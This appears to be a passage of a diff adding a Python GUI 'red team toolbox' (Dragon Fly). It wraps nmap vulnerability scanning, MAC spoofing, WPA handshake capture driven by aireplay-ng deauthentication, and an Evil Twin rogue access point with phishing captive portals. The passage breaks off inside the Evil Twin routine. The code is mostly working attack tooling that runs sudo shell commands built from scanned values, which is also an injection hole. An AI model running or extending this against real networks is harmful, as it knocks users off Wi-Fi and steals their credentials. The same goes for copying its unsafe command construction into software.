@@ -1,0 +1,1332 @@
+import customtkinter as ctk
+import subprocess
+import threading
+import os
+import time
+import socket
+import re
+import tempfile
+from datetime import datetime
+import glob
+import ducky_logic
+from gadget_handler import BLEGadget
+
+# ==========================================
+# CONFIGURACION VISUAL PRO (Red Team Theme)
+# ==========================================
+ctk.set_appearance_mode("Dark")
+COLOR_FONDO_SIDEBAR = "#111111"
+COLOR_FONDO_PRINCIPAL = "#1a1a1a"
+COLOR_BOTON_ROJO = "#a60000"
+COLOR_BOTON_HOVER = "#6b0000"
+COLOR_TEXTO_TERMINAL = "#ff4d4d"
+COLOR_BOTON_PELIGRO = "#ff9900"
+
+# Directorios base para resultados
+BASE_DIR_NMAP = "Resultados_Nmap"
+BASE_DIR_WIFI = "Resultados_Handshake"
+BASE_DIR_EVIL = "Resultados_EvilTwin"
+BASE_DIR_BLE = "Resultados_BLE"
+
+class RedTeamApp(ctk.CTk):
+    def __init__(self):
+        super().__init__()
+
+        self.title("DRAGON FLY - RED TEAM TOOLBOX")
+        
+        self.withdraw() 
+        ancho = self.winfo_screenwidth()
+        alto = self.winfo_screenheight()
+        self.geometry(f"{ancho}x{alto}+0+0") 
+        self.deiconify() 
+        
+        # ===================================================
+        # SOLUCION AGRESIVA AL ENFOQUE (1 Segundo de espera)
+        # ===================================================
+        def aplicar_kiosco():
+            self.attributes('-fullscreen', True)
+            self.attributes('-topmost', True) 
+            self.lift()
+            self.focus_force() 
+            self.update_idletasks()
+            self.event_generate('<Motion>', warp=True, x=ancho//2, y=alto//2)
+            
+        self.after(1000, aplicar_kiosco)
+        
+        self.bind("<Escape>", lambda event: self.destroy())
+        
+        # ===================================================
+        # OPTIMIZACIÓN UI MÓVIL: UNA SOLA COLUMNA PRINCIPAL
+        # ===================================================
+        self.grid_rowconfigure(0, weight=1)
+        self.grid_columnconfigure(0, weight=1)
+
+        # Variables de estado global
+        self.target_ip = ctk.StringVar(value="127.0.0.1")
+        self.usar_rango = ctk.BooleanVar(value=False)
+        self.rango_cidr = ctk.StringVar(value="/24")
+        self.interfaz_seleccionada = ctk.StringVar(value="")
+        self.session_dir_nmap = ""
+        
+        # Estado para flujos complejos (WiFi, BLE)
+        self.wifi_state = {}
+        self.ble_state = {}
+        self.navigation_stack = []
+
+        # Referencias a procesos para Evil Twin
+        self.evil_twin_procs = {
+            'hostapd': None,
+            'dnsmasq': None,
+            'capture': None,
+            'deauth': None
+        }
+        self.evil_twin_stop = False
+
+        # Crear directorios base
+        for d in [BASE_DIR_NMAP, BASE_DIR_WIFI, BASE_DIR_EVIL, BASE_DIR_BLE]:
+            os.makedirs(d, exist_ok=True)
+
+        # ==========================================
+        # INICIALIZACIÓN DEL GADGET BLE 
+        # ==========================================
+        try:
+            self.gadget = BLEGadget()
+            if self.gadget.is_available():
+                self.gadget_available = True
+                print("[+] Gadget ESP32 BLE conectado correctamente.")
+            else:
+                self.gadget_available = False
+                print("[!] Gadget ESP32 BLE no detectado.")
+        except Exception as e:
+            self.gadget = None
+            self.gadget_available = False
+            print(f"[!] Error al inicializar gadget BLE: {e}")
+
+        # Frame principal único (scrollable) - Sin márgenes para 320x240
+        self.main_frame = ctk.CTkScrollableFrame(self, corner_radius=0, fg_color=COLOR_FONDO_PRINCIPAL)
+        self.main_frame.grid(row=0, column=0, sticky="nsew")
+
+        self.back_btn = None
+        self.show_inicio_menu()
+
+    def limpiar_main_frame(self):
+        for widget in self.main_frame.winfo_children():
+            widget.destroy()
+        self.back_btn = None
+
+    def agregar_boton_atras(self, callback):
+        """Añade botón de retroceso optimizado para pantallas pequeñas"""
+        self.back_btn = ctk.CTkButton(self.main_frame, text="← Atrás", width=60, height=28,
+                                      fg_color="#4a4a4a", hover_color="#2b2b2b",
+                                      font=ctk.CTkFont(size=12, weight="bold"),
+                                      command=callback)
+        self.back_btn.pack(anchor="nw", padx=5, pady=2)
+
+    def mostrar_consola(self):
+        """Consola de tamaño ultracompacto (80px) para no sacar elementos de pantalla"""
+        self.console_textbox = ctk.CTkTextbox(self.main_frame, font=ctk.CTkFont(family="Courier", size=10),
+                                             fg_color="#0a0a0a", text_color=COLOR_TEXTO_TERMINAL,
+                                             corner_radius=5, height=80)
+        self.console_textbox.pack(fill="both", expand=True, padx=5, pady=5)
+
+    def escribir_consola(self, texto):
+        self.console_textbox.insert("end", texto + "\n")
+        self.console_textbox.see("end")
+
+    def obtener_interfaces_red(self):
+        try:
+            return sorted([i for i in os.listdir('/sys/class/net/') if i != "lo"])
+        except Exception:
+            return ["wlan0", "eth0"]
+
+    # ==========================================
+    # FUNCIÓN DE VALIDACIÓN DE IP/CIDR 
+    # ==========================================
+    def validar_ip_cidr(self):
+        ip = self.target_ip.get().strip()
+        if self.usar_rango.get():
+            cidr = self.rango_cidr.get().strip()
+            patron_ip = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
+            patron_cidr = r'^/(8|16|24|32)$'
+            if not re.match(patron_ip, ip) or not re.match(patron_cidr, cidr):
+                self.escribir_consola("[!] IP/CIDR inválido.")
+                return False
+        else:
+            patron_ip = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
+            if not re.match(patron_ip, ip):
+                self.escribir_consola("[!] IP inválida.")
+                return False
+        return True
+
+    def obtener_target(self):
+        if not self.validar_ip_cidr():
+            return None
+        if self.usar_rango.get():
+            return f"{self.target_ip.get()}{self.rango_cidr.get()}"
+        return self.target_ip.get()
+
+    # ==========================================
+    # EJECUCIÓN SEGURA DE COMANDOS 
+    # ==========================================
+    def ejecutar_comando(self, comando, callback_after=None, use_shell=True):
+        if use_shell and isinstance(comando, str):
+            self.escribir_consola(f"\nroot@kali:~# {comando}")
+        else:
+            self.escribir_consola(f"\nroot@kali:~# {' '.join(comando)}")
+
+        def run():
+            try:
+                if use_shell:
+                    proc = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE,
+                                            stderr=subprocess.STDOUT, text=True)
+                else:
+                    proc = subprocess.Popen(comando, stdout=subprocess.PIPE,
+                                            stderr=subprocess.STDOUT, text=True)
+                for line in proc.stdout:
+                    self.escribir_consola(line.rstrip())
+                proc.wait()
+                self.escribir_consola("\n[+] Tarea finalizada.")
+                if callback_after:
+                    self.after(0, callback_after)
+            except Exception as e:
+                self.escribir_consola(f"\n[!] ERROR: {e}")
+        threading.Thread(target=run, daemon=True).start()
+
+    # ===================================================
+    # INICIO DRAGON FLY - MENÚ PRINCIPAL INTEGRADO
+    # ===================================================
+    def show_inicio_menu(self):
+        self.limpiar_main_frame()
+        
+        # Título principal adaptado
+        titulo = ctk.CTkLabel(
+            self.main_frame,
+            text="DRAGON FLY SYSTEM",
+            font=ctk.CTkFont(size=16, weight="bold"),
+            text_color="#ff4d4d"
+        )
+        titulo.pack(pady=(10, 5))
+        
+        subtitulo = ctk.CTkLabel(
+            self.main_frame,
+            text="Red Team Toolbox",
+            font=ctk.CTkFont(size=12),
+            text_color="#aaaaaa"
+        )
+        subtitulo.pack(pady=(0, 10))
+
+        # Lista de menús apaisada 
+        opciones = [
+            ("1. Reconocimiento", self.show_recon_menu),
+            ("2. MAC Changer", self.show_mac_menu),
+            ("3. Auditoría WiFi", self.show_wifi_menu),
+            ("4. Bluetooth BLE", self.show_bluetooth_menu),
+            ("5. Rubber Ducky", self.show_ducky_menu),
+            ("6. Utilidades OS", self.show_utils_menu)
+        ]
+
+        for texto, comando in opciones:
+            ctk.CTkButton(self.main_frame, text=texto, command=comando,
+                          fg_color="transparent", border_width=2, border_color=COLOR_BOTON_ROJO,
+                          hover_color=COLOR_BOTON_HOVER, font=ctk.CTkFont(size=14, weight="bold"),
+                          height=35).pack(fill="x", padx=10, pady=3)
+
+    # ==========================================
+    # MENÚ RECONOCIMIENTO (NMAP)
+    # ==========================================
+    def show_recon_menu(self):
+        self.session_dir_nmap = ""
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_inicio_menu)
+        
+        ctk.CTkLabel(self.main_frame, text="RECONOCIMIENTO (NMAP)", 
+                     font=ctk.CTkFont(size=14, weight="bold")).pack(pady=(5,2))
+        
+        # Configuración de target ajustada a 320px
+        config_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
+        config_frame.pack(fill="x", padx=2, pady=2)
+        
+        # Fila 1: IP y Actualizar
+        ctk.CTkLabel(config_frame, text="IP:", font=ctk.CTkFont(size=12)).grid(row=0, column=0, padx=2, pady=2)
+        entry_target = ctk.CTkEntry(config_frame, textvariable=self.target_ip, width=120, height=25)
+        entry_target.grid(row=0, column=1, padx=2, pady=2)
+        ctk.CTkButton(config_frame, text="Set", width=50, height=25, fg_color=COLOR_BOTON_ROJO,
+                     command=lambda: self.escribir_consola(f"[+] Target: {self.obtener_target() or 'Inválido'}")).grid(row=0, column=2, padx=2, pady=2)
+        
+        # Fila 2: Rango
+        chk_rango = ctk.CTkCheckBox(config_frame, text="Usar rango", variable=self.usar_rango, checkbox_width=18, checkbox_height=18, font=ctk.CTkFont(size=12))
+        chk_rango.grid(row=1, column=0, columnspan=2, sticky="w", padx=2, pady=2)
+        ctk.CTkOptionMenu(config_frame, values=["/24", "/16", "/8"], variable=self.rango_cidr, width=60, height=25).grid(row=1, column=2, padx=2, pady=2)
+
+        # Opciones NMAP (1 sola columna para que encaje el texto largo)
+        btn_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
+        btn_frame.pack(fill="x", padx=5, pady=2)
+
+        comandos_nmap = [
+            ("0. Descubrimiento", "-sn {TARGET} -oN {SESSION}/00_hosts.txt"),
+            ("1. Puertos comunes", "-sS -T3 --top-ports 1000 {TARGET} -oN {SESSION}/01_common.txt"),
+            ("2. Full TCP", "-sS -p- -T3 {TARGET} -oN {SESSION}/02_full_tcp.txt"),
+            ("3. Versiones", "-sV --version-intensity 5 {TARGET} -oN {SESSION}/03_services.txt"),
+            ("4. OS Guessing", "-O --osscan-guess {TARGET} -oN {SESSION}/04_os.txt"),
+            ("5. Vulnerabilidades", "--script vuln,exploit {TARGET} -oN {SESSION}/06_vuln.txt"),
+            ("6. Automatizado", f"-sn {{TARGET}} -oN {{SESSION}}/12a_discovery.txt && nmap -sS -p- -T3 {{TARGET}} -oN {{SESSION}}/12b_ports.txt")
+        ]
+
+        for nombre, cmd in comandos_nmap:
+            ctk.CTkButton(btn_frame, text=nombre, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER, height=30,
+                         command=lambda c=cmd: self._ejecutar_nmap(c)).pack(fill="x", pady=2)
+
+        ctk.CTkButton(self.main_frame, text="Ver Resultados", 
+                     fg_color="#4a4a4a", hover_color="#2b2b2b", height=30,
+                     command=self._mostrar_explorador_nmap).pack(pady=5, fill="x", padx=10)
+
+        self.mostrar_consola()
+
+    def _ejecutar_nmap(self, cmd_template):
+        target = self.obtener_target()
+        if target is None:
+            self.escribir_consola("[!] Target inválido.")
+            return
+
+        if not self.session_dir_nmap:
+            timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
+            self.session_dir_nmap = os.path.join(BASE_DIR_NMAP, f"Auditoria-{timestamp}")
+
+        os.makedirs(self.session_dir_nmap, exist_ok=True)
+        comando = cmd_template.replace("{TARGET}", target).replace("{SESSION}", self.session_dir_nmap)
+        self.ejecutar_comando(f"nmap {comando}")
+
+    def _mostrar_explorador_nmap(self):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_recon_menu)
+        ctk.CTkLabel(self.main_frame, text="RESULTADOS NMAP", 
+                     font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        
+        if not os.path.exists(BASE_DIR_NMAP):
+            os.makedirs(BASE_DIR_NMAP)
+        carpetas = sorted([d for d in os.listdir(BASE_DIR_NMAP) if os.path.isdir(os.path.join(BASE_DIR_NMAP, d))], reverse=True)
+        if not carpetas:
+            ctk.CTkLabel(self.main_frame, text="No hay registros.").pack(pady=10)
+            return
+
+        frame = ctk.CTkScrollableFrame(self.main_frame, height=120)
+        frame.pack(fill="both", expand=True, padx=5, pady=5)
+        for carpeta in carpetas:
+            ruta = os.path.join(BASE_DIR_NMAP, carpeta)
+            btn = ctk.CTkButton(frame, text=carpeta, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER, height=28,
+                               command=lambda r=ruta: self._mostrar_archivos_nmap(r))
+            btn.pack(fill="x", pady=2)
+
+    def _mostrar_archivos_nmap(self, ruta):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._mostrar_explorador_nmap)
+        nombre = os.path.basename(ruta)
+        ctk.CTkLabel(self.main_frame, text=f"{nombre}", 
+                     font=ctk.CTkFont(size=12, weight="bold")).pack(pady=5)
+        
+        archivos = sorted([f for f in os.listdir(ruta) if os.path.isfile(os.path.join(ruta, f))])
+        if not archivos:
+            ctk.CTkLabel(self.main_frame, text="Carpeta vacía").pack(pady=10)
+            return
+
+        frame = ctk.CTkScrollableFrame(self.main_frame, height=120)
+        frame.pack(fill="both", expand=True, padx=5, pady=5)
+        for archivo in archivos:
+            ruta_arch = os.path.join(ruta, archivo)
+            btn = ctk.CTkButton(frame, text=archivo, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER, height=28,
+                               command=lambda ra=ruta_arch: self.ejecutar_comando(f"cat '{ra}'"))
+            btn.pack(fill="x", pady=2)
+        self.mostrar_consola()
+
+    # ==========================================
+    # MENÚ MAC CHANGER
+    # ==========================================
+    def show_mac_menu(self):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_inicio_menu)
+        ctk.CTkLabel(self.main_frame, text="DIRECCION MAC", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        
+        interfaces = self.obtener_interfaces_red()
+        if not interfaces:
+            ctk.CTkLabel(self.main_frame, text="No hay interfaces.").pack()
+            return
+            
+        self.interfaz_seleccionada.set(interfaces[0])
+        sel_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
+        sel_frame.pack(pady=5)
+        ctk.CTkLabel(sel_frame, text="Iface: ").pack(side="left")
+        ctk.CTkOptionMenu(sel_frame, variable=self.interfaz_seleccionada, values=interfaces, 
+                        fg_color=COLOR_BOTON_ROJO, button_color=COLOR_BOTON_HOVER, height=28, width=100).pack(side="left")
+        
+        botones = [
+            ("Ver Estado", f"sudo macchanger -s {self.interfaz_seleccionada.get()}"),
+            ("MAC Random", f"sudo ifconfig {self.interfaz_seleccionada.get()} down && sudo macchanger -r {self.interfaz_seleccionada.get()} && sudo ifconfig {self.interfaz_seleccionada.get()} up"),
+            ("Reset Original", f"sudo ifconfig {self.interfaz_seleccionada.get()} down && sudo macchanger -p {self.interfaz_seleccionada.get()} && sudo ifconfig {self.interfaz_seleccionada.get()} up"),
+            ("Mismo Fabricante", f"sudo ifconfig {self.interfaz_seleccionada.get()} down && sudo macchanger -a {self.interfaz_seleccionada.get()} && sudo ifconfig {self.interfaz_seleccionada.get()} up")
+        ]
+        
+        for texto, cmd in botones:
+            ctk.CTkButton(self.main_frame, text=texto, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER, height=35,
+                        command=lambda c=cmd: self.ejecutar_comando(c)).pack(fill="x", padx=10, pady=2)
+                        
+        self.mostrar_consola()
+
+    # ==========================================
+    # MENÚ AUDITORÍA WIFI
+    # ==========================================
+    def show_wifi_menu(self):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_inicio_menu)
+        ctk.CTkLabel(self.main_frame, text="AUDITORÍA WIFI", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        
+        opciones = [
+            ("Activar Monitor", self._wifi_modo_monitor),
+            ("Captura Handshake", self._wifi_captura_handshake),
+            ("Ataque Evil Twin", self._wifi_evil_twin),
+            ("Desautenticación", self._wifi_deauth),
+            ("Explorar Handshakes", self._wifi_explorar_handshakes),
+            ("Explorar Evil Twin", self._wifi_explorar_evil),
+        ]
+        for texto, cmd in opciones:
+            ctk.CTkButton(self.main_frame, text=texto, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER,
+                         height=35).pack(fill="x", padx=10, pady=3)
+                         
+        self.mostrar_consola()
+
+    def _wifi_modo_monitor(self):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_wifi_menu)
+        ctk.CTkLabel(self.main_frame, text="MODO MONITOR", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        interfaces = self.obtener_interfaces_red()
+        if not interfaces:
+            ctk.CTkLabel(self.main_frame, text="No hay interfaces.").pack()
+            return
+        for iface in interfaces:
+            ctk.CTkButton(self.main_frame, text=f"Start {iface}", 
+                         fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER, height=35,
+                         command=lambda i=iface: self.ejecutar_comando(
+                             f"sudo airmon-ng check kill && sudo airmon-ng start {i}",
+                             callback_after=lambda: self.escribir_consola("[+] Hecho.")
+                         )).pack(fill="x", padx=10, pady=3)
+        self.mostrar_consola()
+
+    def _generar_nombre_temporal(self, prefijo):
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
+        return f"/tmp/{prefijo}_{timestamp}"
+
+    def _wifi_captura_handshake(self):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_wifi_menu)
+        ctk.CTkLabel(self.main_frame, text="CAPTURAR: Elija IFace", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        interfaces = self.obtener_interfaces_red()
+        for iface in interfaces:
+            ctk.CTkButton(self.main_frame, text=iface, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER, height=35,
+                         command=lambda i=iface: self._wifi_escanear_redes_handshake(i)).pack(fill="x", padx=10, pady=3)
+        self.mostrar_consola()
+
+    def _wifi_escanear_redes_handshake(self, iface):
+        self.wifi_state = {"iface": iface, "mon_iface": None}
+        self.escribir_consola(f"[*] Modo monitor en {iface}...")
+        os.system("sudo airmon-ng check kill >/dev/null 2>&1")
+        os.system(f"sudo airmon-ng start {iface} >/dev/null 2>&1")
+        mon = f"{iface}mon" if os.path.exists(f"/sys/class/net/{iface}mon") else iface
+        self.wifi_state["mon_iface"] = mon
+        scan_prefix = self._generar_nombre_temporal("wifi_handshake")
+        self.wifi_state["scan_file"] = scan_prefix 
+        
+        def escanear():
+            os.system(f"sudo timeout 15s airodump-ng {mon} -w {scan_prefix} --output-format csv >/dev/null 2>&1")
+            redes = []
+            try:
+                with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
+                    partes = f.read().split("Station MAC,")
+                    for linea in partes[0].split("\n")[2:]:
+                        r = linea.split(",")
+                        if len(r) >= 14 and ":" in r[0]:
+                            redes.append({"bssid": r[0].strip(), "ch": r[3].strip(), 
+                                         "essid": r[13].strip() if r[13].strip() else "<Oculta>"})
+            except: pass
+            finally:
+                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
+                    try: os.remove(f"{scan_prefix}{ext}")
+                    except: pass
+            self.after(0, lambda: self._wifi_mostrar_redes_handshake(redes))
+        threading.Thread(target=escanear, daemon=True).start()
+        self.escribir_consola("[*] Escaneando 15s...")
+
+    def _wifi_mostrar_redes_handshake(self, redes):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._wifi_captura_handshake)
+        ctk.CTkLabel(self.main_frame, text="SELECCIONA RED", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        if not redes: return ctk.CTkLabel(self.main_frame, text="No hay redes.").pack()
+        
+        frame = ctk.CTkScrollableFrame(self.main_frame, height=120)
+        frame.pack(fill="both", expand=True, padx=5, pady=5)
+        for red in redes:
+            texto = f"{red['essid']} (CH:{red['ch']})"
+            btn = ctk.CTkButton(frame, text=texto, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER, height=28,
+                               command=lambda r=red: self._wifi_seleccionar_cliente_handshake(r))
+            btn.pack(fill="x", pady=2)
+        self.mostrar_consola()
+
+    def _wifi_seleccionar_cliente_handshake(self, red):
+        self.wifi_state["target"] = red
+        mon = self.wifi_state["mon_iface"]
+        scan_prefix = self._generar_nombre_temporal("wifi_clients")
+        os.system(f"sudo timeout 10s airodump-ng --bssid {red['bssid']} -c {red['ch']} {mon} -w {scan_prefix} --output-format csv >/dev/null 2>&1")
+        clientes = []
+        try:
+            with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
+                partes = f.read().split("Station MAC,")
+                if len(partes) > 1:
+                    for linea in partes[1].split("\n")[1:]:
+                        c = linea.split(",")
+                        if len(c) >= 6 and ":" in c[0]:
+                            clientes.append(c[0].strip())
+        except: pass
+        finally:
+            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
+                try: os.remove(f"{scan_prefix}{ext}")
+                except: pass
+        
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(lambda: self._wifi_mostrar_redes_handshake([red]))
+        ctk.CTkLabel(self.main_frame, text="CLIENTES", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        frame = ctk.CTkScrollableFrame(self.main_frame, height=120)
+        frame.pack(fill="both", expand=True, padx=5, pady=5)
+        
+        ctk.CTkButton(frame, text="Todos (Broadcast)", fg_color=COLOR_BOTON_PELIGRO, hover_color="#cc7a00", height=28,
+                     command=lambda: self._wifi_iniciar_ataque_handshake("FF:FF:FF:FF:FF:FF")).pack(fill="x", pady=2)
+        for mac in clientes:
+            ctk.CTkButton(frame, text=mac, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER, height=28,
+                         command=lambda m=mac: self._wifi_iniciar_ataque_handshake(m)).pack(fill="x", pady=2)
+        self.mostrar_consola()
+
+    def _wifi_iniciar_ataque_handshake(self, cliente_mac):
+        red = self.wifi_state["target"]
+        mon = self.wifi_state["mon_iface"]
+        timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
+        session_dir = os.path.join(BASE_DIR_WIFI, f"Auditoria-{timestamp}")
+        os.makedirs(session_dir, exist_ok=True)
+        
+        cmd_airodump = f"sudo airodump-ng --channel {red['ch']} --bssid {red['bssid']} -w {session_dir}/Captura {mon} >/dev/null 2>&1 &"
+        os.system(cmd_airodump)
+        time.sleep(2)
+        cmd_deauth = f"sudo aireplay-ng -0 10 -a {red['bssid']} -c {cliente_mac} {mon}"
+        self.ejecutar_comando(cmd_deauth, callback_after=lambda: self.escribir_consola(f"[+] Salvado: {session_dir}"))
+        self.escribir_consola("[*] Esperando handshake...")
+
+    # EVIL TWIN
+    def _wifi_evil_twin(self):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_wifi_menu)
+        ctk.CTkLabel(self.main_frame, text="EVIL TWIN - IFace AP", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        interfaces = self.obtener_interfaces_red()
+        if len(interfaces) < 2: return ctk.CTkLabel(self.main_frame, text="Requiere 2 interfaces.").pack()
+        
+        for iface in interfaces:
+            ctk.CTkButton(self.main_frame, text=f"AP: {iface}", fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER, height=35,
+                          command=lambda i=iface: self._evil_twin_select_deauth(i)).pack(fill="x", padx=10, pady=3)
+        self.mostrar_consola()
+
+    def _evil_twin_select_deauth(self, ap_iface):
+        self.wifi_state["ap_iface"] = ap_iface
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._wifi_evil_twin)
+        ctk.CTkLabel(self.main_frame, text="IFace Deauth", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        for iface in [i for i in self.obtener_interfaces_red() if i != ap_iface]:
+            ctk.CTkButton(self.main_frame, text=iface, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER, height=35,
+                          command=lambda i=iface: self._evil_twin_escanear_redes(i)).pack(fill="x", padx=10, pady=3)
+        self.mostrar_consola()
+
+    def _evil_twin_escanear_redes(self, deauth_iface):
+        self.wifi_state["deauth_iface"] = deauth_iface
+        os.system("sudo airmon-ng check kill >/dev/null 2>&1")
+        os.system(f"sudo airmon-ng start {deauth_iface} >/dev/null 2>&1")
+        mon = f"{deauth_iface}mon" if os.path.exists(f"/sys/class/net/{deauth_iface}mon") else deauth_iface
+        self.wifi_state["mon_deauth"] = mon
+
+        scan_prefix = self._generar_nombre_temporal("evil_scan")
+        self.wifi_state["scan_file"] = scan_prefix
+        
+        def escanear():
+            os.system(f"sudo timeout 15s airodump-ng {mon} -w {scan_prefix} --output-format csv >/dev/null 2>&1")
+            redes = []
+            try:
+                with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
+                    partes = f.read().split("Station MAC,")
+                    for linea in partes[0].split("\n")[2:]:
+                        r = linea.split(",")
+                        if len(r) >= 14 and ":" in r[0]:
+                            redes.append({"bssid": r[0].strip(), "ch": r[3].strip(), "essid": r[13].strip() or "<Oculta>"})
+            except: pass
+            finally:
+                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
+                    try: os.remove(f"{scan_prefix}{ext}")
+                    except: pass
+            self.after(0, lambda: self._evil_twin_mostrar_redes(redes))
+        threading.Thread(target=escanear, daemon=True).start()
+        self.escribir_consola("[*] Escaneando redes...")
+
+    def _evil_twin_mostrar_redes(self, redes):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._wifi_evil_twin)
+        ctk.CTkLabel(self.main_frame, text="RED OBJETIVO", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        if not redes: return ctk.CTkLabel(self.main_frame, text="No hay redes.").pack()
+        
+        frame = ctk.CTkScrollableFrame(self.main_frame, height=120)
+        frame.pack(fill="both", expand=True, padx=5, pady=5)
+        for red in redes:
+            texto = f"{red['essid']} (CH:{red['ch']})"
+            ctk.CTkButton(frame, text=texto, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER, height=28,
+                          command=lambda r=red: self._evil_twin_seleccionar_portal(r)).pack(fill="x", pady=2)
+        self.mostrar_consola()
+
+    def _evil_twin_seleccionar_portal(self, red):
+        self.wifi_state["target"] = red
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(lambda: self._evil_twin_mostrar_redes([red]))
+        ctk.CTkLabel(self.main_frame, text="PORTAL CAUTIVO", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        portals_dir = os.path.join(os.path.dirname(__file__), "evil_portals")
+        os.makedirs(portals_dir, exist_ok=True)
+        portales = [d for d in os.listdir(portals_dir) if os.path.isdir(os.path.join(portals_dir, d))]
+        
+        frame = ctk.CTkScrollableFrame(self.main_frame, height=120)
+        frame.pack(fill="both", expand=True, padx=5, pady=5)
+        for portal in sorted(portales):
+            if os.path.isfile(os.path.join(portals_dir, portal, "index.html")):
+                ctk.CTkButton(frame, text=portal, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER, height=28,
+                              command=lambda p=portal: self._evil_twin_seleccionar_deauth_mode(red, p)).pack(fill="x", pady=2)
+        self.mostrar_consola()
+
+    def _evil_twin_seleccionar_deauth_mode(self, red, portal):
+        self.wifi_state["portal_name"] = portal
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(lambda: self._evil_twin_seleccionar_portal(red))
+        ctk.CTkLabel(self.main_frame, text="MODO DEAUTH", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        ctk.CTkButton(self.main_frame, text="Broadcast", fg_color=COLOR_BOTON_PELIGRO, height=35,
+                      command=lambda: self._evil_twin_ejecutar(red, portal, "broadcast")).pack(fill="x", padx=10, pady=5)
+        ctk.CTkButton(self.main_frame, text="Dirigido", fg_color=COLOR_BOTON_ROJO, height=35,
+                      command=lambda: self._evil_twin_escanear_clientes(red, portal)).pack(fill="x", padx=10, pady=5)
+        self.mostrar_consola()
+
+    def _evil_twin_escanear_clientes(self, red, portal):
+        mon = self.wifi_state.get("mon_deauth")
+        scan_prefix = self._generar_nombre_temporal("evil_clients")
+        os.system(f"sudo timeout 10s airodump-ng --bssid {red['bssid']} -c {red['ch']} {mon} -w {scan_prefix} --output-format csv >/dev/null 2>&1")
+        clientes = []
+        try:
+            with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
+                partes = f.read().split("Station MAC,")
+                if len(partes) > 1:
+                    for linea in partes[1].split("\n")[1:]:
+                        c = linea.split(",")
+                        if len(c) >= 6 and ":" in c[0]: clientes.append(c[0].strip())
+        except: pass
+        finally:
+            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
+                try: os.remove(f"{scan_prefix}{ext}")
+                except: pass
+
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(lambda: self._evil_twin_seleccionar_deauth_mode(red, portal))
+        ctk.CTkLabel(self.main_frame, text="CLIENTES", font=ctk.CTkFont(size=14, weight="bold")).pack(pady=5)
+        frame = ctk.CTkScrollableFrame(self.main_frame, height=120)
+        frame.pack(fill="both", expand=True, padx=5, pady=5)
+        for mac in clientes:
+            ctk.CTkButton(frame, text=mac, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER, height=28,
+                          command=lambda m=mac: self._evil_twin_ejecutar(red, portal, "directed", m)).pack(fill="x", pady=2)
+        self.mostrar_consola()
+
+    def _evil_twin_ejecutar(self, red, portal, deauth_mode, cliente_mac=None):
+        timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
+        session_dir = os.path.join(BASE_DIR_EVIL, f"Auditoria-{timestamp}")
+        os.makedirs(session_dir, exist_ok=True)
+
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_wifi_menu)
